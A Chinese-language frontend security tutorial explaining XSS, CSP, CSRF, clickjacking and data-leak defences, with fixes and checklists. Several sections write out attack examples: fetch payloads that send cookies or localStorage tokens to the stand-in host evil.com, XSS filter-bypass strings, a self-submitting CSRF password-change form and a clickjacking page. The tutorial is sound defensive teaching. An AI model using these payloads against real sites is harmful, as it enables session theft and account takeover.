# 前端安全完全指南：从 XSS 到 CSP 的攻防实战

> 在 Web 开发中，安全往往是最后才被考虑的因素，但一旦发生安全事故，后果可能是灾难性的。本文将深入剖析前端安全的各个维度，从攻击原理到防御策略，帮助你构建更安全的 Web 应用。

##  为什么前端安全至关重要？

在传统观念中，"前端无秘密"——所有代码都暴露在用户浏览器中。但这并不意味着前端安全不重要：

1. **用户数据保护**：XSS 可以窃取用户的 cookie、localStorage、甚至执行恶意操作
2. **业务安全**：CSRF 可以冒充用户发起请求，造成资金损失
3. **品牌声誉**：安全事故会严重损害用户信任
4. **合规要求**：GDPR、网络安全法等对数据安全有严格要求

##  前端安全威胁全景图

```
┌─────────────────────────────────────────────────────────┐
│                    前端安全威胁                           │
├─────────────────┬───────────────────┬───────────────────┤
│   注入类攻击    │    请求伪造攻击    │    数据泄露攻击    │
├─────────────────┼───────────────────┼───────────────────┤
│ • XSS           │ • CSRF            │ • 敏感信息明文    │
│ • HTML 注入     │ • Clickjacking    │ • localStorage    │
│ • SQL 注入      │ • SSRF            │ • URL 参数泄露    │
│ • 命令注入      │                   │ • Console 打印    │
└─────────────────┴───────────────────┴───────────────────┘
```

## 一、XSS（跨站脚本攻击）：最常见的安全威胁

### 1.1 XSS 攻击类型

#### 反射型 XSS（Reflected XSS）

攻击脚本通过 URL 参数注入，服务器接收后"反射"回页面。

```javascript
// 漏洞代码示例
app.get('/search', (req, res) => {
  const keyword = req.query.q
  // 危险：直接将用户输入拼接到 HTML
  res.send(`
    <h1>搜索结果：${keyword}</h1>
    <div>...</div>
  `)
})

// 攻击 URL
// https://example.com/search?q=<script>fetch('https://evil.com?c='+document.cookie)</script>
```

**防御**：对用户输入进行 HTML 转义

```javascript
function escapeHtml(str) {
  const escapeMap = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;'
  }
  return str.replace(/[&<>"'/]/g, char => escapeMap[char])
}

// 安全版本
app.get('/search', (req, res) => {
  const keyword = escapeHtml(req.query.q)
  res.send(`<h1>搜索结果：${keyword}</h1>`)
})
```

#### 存储型 XSS（Stored XSS）

攻击脚本被存储到数据库，每次访问都会执行。危害最大！

```javascript
// 评论系统漏洞示例
app.post('/comment', async (req, res) => {
  const { content } = req.body
  // 直接存储，未过滤
  await db.insertComment(content)
  res.json({ success: true })
})

// 攻击者提交
content: '<img src=x onerror="fetch(\'https://evil.com?c=\'+document.cookie)">'
```

**防御策略**：

```javascript
const DOMPurify = require('dompurify')

app.post('/comment', async (req, res) => {
  const { content } = req.body
  // 使用 DOMPurify 清理 HTML
  const cleanContent = DOMPurify.sanitize(content, {
    ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href']
  })
  await db.insertComment(cleanContent)
  res.json({ success: true })
})
```

#### DOM 型 XSS（DOM-based XSS）

攻击发生在客户端，通过 JavaScript 直接操作 DOM 导致。

```javascript
// 危险：直接使用 location.hash
document.write(location.hash.substring(1))

// 危险：innerHTML 赋值
document.getElementById('content').innerHTML = location.search.slice(1)

// 安全替代方案
document.getElementById('content').textContent = location.search.slice(1)
```

### 1.2 XSS 高级攻击技巧

#### 绕过简单过滤

```javascript
// 大小写混淆
<ScRiPt>alert(1)</sCrIpT>

// 编码绕过
<img src=x onerror="&#97;lert(1)">

// 事件处理器
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

// JavaScript 伪协议
<a href="javascript:alert(1)">click</a>

// HTML 实体编码
<div onclick="alert('&#x27;')">
```

#### Mutation XSS（mXSS）

利用浏览器 HTML 解析器的特性：

```javascript
// 某些情况下，转义后的内容会被浏览器重新解析
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

### 1.3 Content Security Policy（CSP）：XSS 的终极防线

CSP 是 HTTP 响应头，限制浏览器只能加载指定来源的资源。

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; style-src 'self' 'unsafe-inline'
```

**在 HTML meta 标签中设置**：

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">
```

**Vue/React 项目配置示例**：

```javascript
// vite.config.js
export default {
  server: {
    headers: {
      'Content-Security-Policy': `
        default-src 'self';
        script-src 'self' 'unsafe-eval' https://cdn.example.com;
        style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
        font-src 'self' https://fonts.gstatic.com;
        img-src 'self' data: https:;
        connect-src 'self' https://api.example.com;
      `.replace(/\n/g, '')
    }
  }
}
```

**CSP 指令详解**：

| 指令 | 说明 | 示例 |
|------|------|------|
| `default-src` | 默认资源加载策略 | `'self'` |
| `script-src` | JavaScript 来源 | `'self' 'unsafe-inline'` |
| `style-src` | CSS 来源 | `'self' 'unsafe-inline'` |
| `img-src` | 图片来源 | `'self' data:` |
| `connect-src` | AJAX/WebSocket 来源 | `'self' https://api.example.com` |
| `font-src` | 字体来源 | `'self' https://fonts.gstatic.com` |
| `frame-src` | iframe 来源 | `'none'` |
| `report-uri` | 违规报告地址 | `https://example.com/csp-report` |

**特殊关键字**：

- `'self'`：同源
- `'none'`：禁止所有
- `'unsafe-inline'`：允许内联脚本/样式（不推荐）
- `'unsafe-eval'`：允许 eval（不推荐）
- `'nonce-xxx'`：允许带特定 nonce 的内联脚本
- `'sha256-xxx'`：允许特定哈希值的脚本

**使用 nonce 的 CSP 最佳实践**：

```javascript
// Express 中间件
app.use((req, res, next) => {
  res.locals.cspNonce = crypto.randomBytes(16).toString('base64')
  res.setHeader(
    'Content-Security-Policy',
    `script-src 'self' 'nonce-${res.locals.cspNonce}'`
  )
  next()
})

// 在模板中使用
app.get('/', (req, res) => {
  res.send(`
    <script nonce="${res.locals.cspNonce}">
      // 这是安全的内联脚本
      console.log('Hello')
    </script>
  `)
})
```

## 二、CSRF（跨站请求伪造）：隐形的攻击者

### 2.1 CSRF 攻击原理

攻击者诱导用户在已登录状态下访问恶意页面，自动发送伪造请求。

```html
<!-- 攻击者网站 evil.com -->
<img src="https://bank.example.com/transfer?to=attacker&amount=10000">
```

### 2.2 CSRF 防御策略

#### 方案一：CSRF Token

```javascript
// 服务端生成 Token
const csrf = require('csurf')
const csrfProtection = csrf({ cookie: true })

app.get('/form', csrfProtection, (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() })
})

app.post('/transfer', csrfProtection, (req, res) => {
  // Token 验证通过才会执行
  const { to, amount } = req.body
  // ...
})

// 前端表单
<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="<%= csrfToken %>">
  <!-- 其他字段 -->
</form>
```

#### 方案二：SameSite Cookie

```javascript
// Express 设置
app.use(session({
  cookie: {
    sameSite: 'strict', // 或 'lax'
    httpOnly: true,
    secure: true
  }
}))
```

**SameSite 值对比**：

| 值 | 行为 | 推荐场景 |
|----|------|----------|
| `strict` | 完全禁止跨站发送 Cookie | 高安全场景（支付、管理后台） |
| `lax` | 允许 GET 请求携带 Cookie | 大多数网站 |
| `none` | 允许跨站发送（需配合 secure） | 需要跨站的场景 |

#### 方案三：验证 Referer/Origin

```javascript
app.post('/api/action', (req, res) => {
  const referer = req.get('Referer')
  const origin = req.get('Origin')

  if (!referer && !origin) {
    return res.status(403).json({ error: 'Missing origin header' })
  }

  const allowedOrigins = ['https://example.com', 'https://www.example.com']
  const requestOrigin = origin || new URL(referer).origin

  if (!allowedOrigins.includes(requestOrigin)) {
    return res.status(403).json({ error: 'Invalid origin' })
  }

  // 处理请求
})
```

### 2.3 现代前端框架的 CSRF 防护

**Axios 自动 CSRF 支持**：

```javascript
// Axios 会自动从 cookie 读取 xsrf-token 并在请求头中发送
axios.defaults.xsrfCookieName = 'XSRF-TOKEN'
axios.defaults.xsrfHeaderName = 'X-XSRF-TOKEN'

// 或者在每个请求中添加
axios.interceptors.request.use(config => {
  const csrfToken = getCookie('XSRF-TOKEN') // 从 cookie 读取
  if (csrfToken) {
    config.headers['X-XSRF-TOKEN'] = csrfToken
  }
  return config
})
```

## 三、点击劫持（Clickjacking）：透明iframe的陷阱

### 3.1 攻击示例

```html
<!-- 攻击者页面 -->
<style>
  iframe {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    opacity: 0;
    z-index: 2;
  }
  .button {
    position: absolute;
    top: 100px;
    left: 100px;
    z-index: 1;
  }
</style>

<iframe src="https://bank.example.com/transfer"></iframe>
<button class="button">点击领取红包</button>
```

用户以为点击"领取红包"，实际点击了银行页面的转账按钮。

### 3.2 防御：X-Frame-Options 和 CSP

```javascript
// 方式一：X-Frame-Options（旧方案）
app.use((req, res, next) => {
  res.setHeader('X-Frame-Options', 'DENY') // 或 'SAMEORIGIN'
  next()
})

// 方式二：CSP frame-ancestors（新标准）
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', "frame-ancestors 'none'")
  next()
})
```

**JavaScript 检测被嵌入 iframe**：

```javascript
// 防止页面被嵌入 iframe
if (window.top !== window.self) {
  window.top.location = window.self.location
}

// 更现代的方式
if (window.frameElement) {
  window.frameElement.remove()
}
```

## 四、敏感数据泄露：无处不在的隐患

### 4.1 常见泄露场景

#### localStorage 存储 Token

```javascript
// 错误 错误：敏感 token 存储在 localStorage
localStorage.setItem('token', 'eyJhbGciOi...')
// XSS 可以轻松读取
// <script>
//   fetch('https://evil.com?token=' + localStorage.getItem('token'))
// </script>

// 正确 正确：使用 HttpOnly Cookie
// 服务端设置
res.cookie('token', token, {
  httpOnly: true,  // JavaScript 无法读取
  secure: true,    // 仅 HTTPS
  sameSite: 'strict',
  maxAge: 3600000
})
```

#### URL 参数泄露

```javascript
// 错误 错误：敏感信息在 URL 中
// https://example.com/reset-password?token=abc123&email=user@example.com

// 正确 正确：使用 POST 请求
app.post('/reset-password', (req, res) => {
  const { token, email, newPassword } = req.body
  // token 在请求体中，不会出现在 URL
})
```

#### Console 打印敏感信息

```javascript
// 错误 开发环境遗留代码
console.log('User token:', token)
console.log('API response:', { user, password: '...' })

// 正确 生产环境移除
if (process.env.NODE_ENV === 'development') {
  console.log('Debug info:', data)
}

// 或使用构建工具自动移除
// vite.config.js
export default {
  build: {
    terserOptions: {
      compress: {
        drop_console: true
      }
    }
  }
}
```

### 4.2 敏感数据处理最佳实践

```javascript
// 敏感数据脱敏
function maskEmail(email) {
  const [local, domain] = email.split('@')
  const masked = local.substring(0, 2) + '***'
  return `${masked}@${domain}`
}

function maskPhone(phone) {
  return phone.replace(/(\d{3})\d{4}(\d{4})/, '$1****$2')
}

// 敏感字段过滤
function sanitizeUser(user) {
  const { password, ssn, creditCard, ...safeUser } = user
  return safeUser
}

// API 响应示例
app.get('/api/user/:id', (req, res) => {
  const user = db.getUser(req.params.id)
  res.json({
    ...sanitizeUser(user),
    email: maskEmail(user.email),
    phone: maskPhone(user.phone)
  })
})
```

## 五、安全相关的 HTTP 响应头清单

```javascript
// Express 安全头配置
const helmet = require('helmet')

app.use(helmet())

// 或手动配置
app.use((req, res, next) => {
  // XSS 保护
  res.setHeader('X-XSS-Protection', '1; mode=block')

  // 禁止 MIME 类型嗅探
  res.setHeader('X-Content-Type-Options', 'nosniff')

  // 点击劫持防护
  res.setHeader('X-Frame-Options', 'DENY')

  // HTTPS 强制（生产环境）
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains')

  // CSP
  res.setHeader('Content-Security-Policy', "default-src 'self'")

  // Referrer 策略
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin')

  // 权限策略
  res.setHeader('Permissions-Policy', 'geolocation=(), microphone=(), camera=()')

  next()
})
```

## 六、安全测试与检测工具

### 6.1 自动化扫描工具

```bash
# OWASP ZAP（开源）
zap-cli quick-scan https://example.com

# Nikto
nikto -h https://example.com

# npm 安全审计
npm audit

# 依赖漏洞扫描
npm audit fix
```

### 6.2 手动测试 Checklist

```markdown
[ ] XSS 测试
  - 输入框注入测试：<script>alert(1)</script>
  - URL 参数注入测试
  - 富文本编辑器测试

[ ] CSRF 测试
  - 跨站请求测试
  - Token 验证测试

[ ] 权限测试
  - 越权访问测试
  - IDOR（不安全的直接对象引用）测试

[ ] 数据泄露测试
  - URL 参数检查
  - localStorage 检查
  - Network 面板敏感信息检查
```

## 七、真实案例分析

### 案例 1：某电商网站 XSS 事故

**问题**：商品评论未过滤，攻击者注入恶意脚本窃取用户 cookie

```html
<!-- 注入的恶意评论 -->
好评！<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
```

**影响**：
- 大量用户 session 被窃取
- 攻击者可冒充用户下单、修改收货地址
- 平台损失数十万元

**修复**：
1. 评论内容使用 DOMPurify 过滤
2. Cookie 设置 HttpOnly
3. 部署 CSP

### 案例 2：某社交平台 CSRF 漏洞

**问题**：修改密码接口无 CSRF 防护

```html
<!-- 攻击者页面 -->
<form action="https://social.example.com/change-password" method="POST">
  <input type="hidden" name="newPassword" value="hacked123">
</form>
<script>document.forms[0].submit()</script>
```

**影响**：用户访问攻击者页面后，密码被修改，账号被盗

**修复**：
1. 添加 CSRF Token 验证
2. 修改密码需输入原密码
3. 关键操作二次验证

## 八、安全开发流程建议

```
┌────────────────────────────────────────────────────────┐
│                    安全是持续的过程                      │
├────────────────────────────────────────────────────────┤
│                                                        │
│  1. 威胁建模 → 识别资产和威胁                            │
│        ↓                                               │
│  2. 安全设计 → 架构层面防御                              │
│        ↓                                               │
│  3. 安全编码 → 遵循安全编码规范                          │
│        ↓                                               │
│  4. 安全测试 → 自动化 + 手动测试                         │
│        ↓                                               │
│  5. 安全运维 → 监控、应急响应                            │
│        ↓                                               │
│  6. 持续改进 ← 学习新的攻击技术                          │
│                                                        │
└────────────────────────────────────────────────────────┘
```

### Code Review 安全清单

```markdown
## 前端安全 Code Review Checklist

### 输入验证
- [ ] 所有用户输入都经过验证和转义
- [ ] 不信任任何来自客户端的数据
- [ ] 使用白名单而非黑名单

### XSS 防护
- [ ] 使用框架的自动转义（Vue 的 {{}}、React 的 JSX）
- [ ] 避免 v-html 和 dangerouslySetInnerHTML
- [ ] 必要时使用 DOMPurify

### CSRF 防护
- [ ] 状态改变操作使用 POST
- [ ] 实现 CSRF Token 或 SameSite Cookie
- [ ] 验证 Origin/Referer

### 数据安全
- [ ] 敏感 Token 使用 HttpOnly Cookie
- [ ] 不在 URL 中传递敏感信息
- [ ] 生产环境移除 console.log
- [ ] API 响应过滤敏感字段

### 第三方依赖
- [ ] 定期运行 npm audit
- [ ] 审查第三方库的权限
- [ ] 使用 lock 文件锁定版本
```

## 总结

前端安全不是一次性任务，而是需要贯穿开发全流程的思维习惯：

1. **永远不要信任用户输入**：所有外部数据都是潜在的攻击载体
2. **纵深防御**：单一防线总有可能被突破，需要多层防护
3. **最小权限原则**：默认拒绝，按需开放
4. **安全意识**：团队成员都需要了解基本的安全知识
5. **持续学习**：新的攻击手段层出不穷，保持更新

记住：**安全是成本，不是收益；但安全事故的成本远高于预防的成本。**

---

*本文由小虾子  撰写*
